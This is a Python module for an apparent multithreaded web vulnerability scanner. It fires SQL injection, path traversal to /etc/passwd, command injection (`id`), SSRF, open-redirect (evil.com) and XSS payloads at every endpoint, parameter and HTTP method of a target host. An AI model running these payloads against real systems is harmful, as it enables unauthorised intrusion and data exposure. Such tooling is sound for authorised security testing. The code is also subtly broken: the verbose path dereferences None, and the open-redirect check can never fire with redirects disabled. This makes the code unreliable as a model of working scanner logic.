import os
import requests
from urllib.parse import urljoin, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from config import HTTP_HEADERS, DEFAULT_TIMEOUT, COMMON_ENDPOINTS, PARAMS
from module.other import Other

class Top25FastScanner:
    METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH"]
    PAYLOAD = {
        "SQLi": "1' OR '1'='1",
        "LFI": "../../../../etc/passwd",
        "OpenRedirect": "https://evil.com",
        "RCE": "`id`",
        "SSRF": "http://127.0.0.1",
        "XSS": "<script>alert(1)</script>"
    }
    INDICATORS = {
        "SQLi": ["mysql", "syntax", "sql", "query failed"],
        "LFI": ["root:x:0:0", "/bin/bash", "root:x"],
        "OpenRedirect": ["evil.com"],
        "RCE": ["uid=", "gid=", "rce_test"],
        "SSRF": ["localhost", "127.0.0.1"],
        "XSS": ["<script>alert(1)</script>", "&lt;script&gt;"]
    }

    def __init__(self, args):
        self.target = f"http://{args.target}".rstrip("/")
        self.verbose = args.verbose
        self.threads = args.threads
        self.session = requests.Session()
        self.session.headers.update(HTTP_HEADERS)
        self.endpoints = open(COMMON_ENDPOINTS).read().splitlines()
        self.params = PARAMS
        self.module_name = os.path.splitext(os.path.basename(__file__))[0]
        self.printer = Other()

    def _log(self, level, category, method, param, url, status):
        cm = self.printer.color_text(self.module_name, "cyan")
        cat = self.printer.color_text(category, "yellow")
        m = self.printer.color_text(method, "magenta")
        p = self.printer.color_text(param, "green")
        st = self.printer.color_text(str(status), "green" if status == 200 else "red")
        print(f"[{level}] [Module: {cm}] [Cat:{cat}] [Method:{m}] [Param:{p}] [Status:{st}] {url}")

    def scan(self):
        results = []
        tasks = []
        for cat, ps in self.params.items():
            payload = self.PAYLOAD.get(cat)
            for endpoint in self.endpoints:
                url = urljoin(self.target, endpoint)
                for param in ps:
                    for method in self.METHODS:
                        tasks.append((cat, method, url, param, payload))

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(self._scan_once, cat, method, url, param, payload): (cat, method, url, param, payload)
                       for cat, method, url, param, payload in tasks}
            for fut in as_completed(futures):
                res = fut.result()
                if res:
                    results.append(res)
                    self._log("+", **res)
                elif self.verbose:
                    cat, method, url, param, payload = futures[fut]
                    self._log("-", cat, method, param, url, res.get("status", "ERR"))

        return {"target": self.target, "findings": results}

    def _scan_once(self, category, method, url, param, payload):
        data = {param: payload}
        fullurl = url if method != "GET" else f"{url}?{urlencode(data)}"
        try:
            resp = self.session.request(method, url, params=data if method=="GET" else None, data=None if method=="GET" else data,
                                        timeout=DEFAULT_TIMEOUT, allow_redirects=False)
            text = resp.text.lower()
            if resp.status_code in (200, 201):
                for sig in self.INDICATORS.get(category, []):
                    if sig in text:
                        return {"category": category, "method": method, "param": param,
                                "url": fullurl, "status": resp.status_code}
        except:
            pass
        return None

def scan(args=None):
    return Top25FastScanner(args).scan()
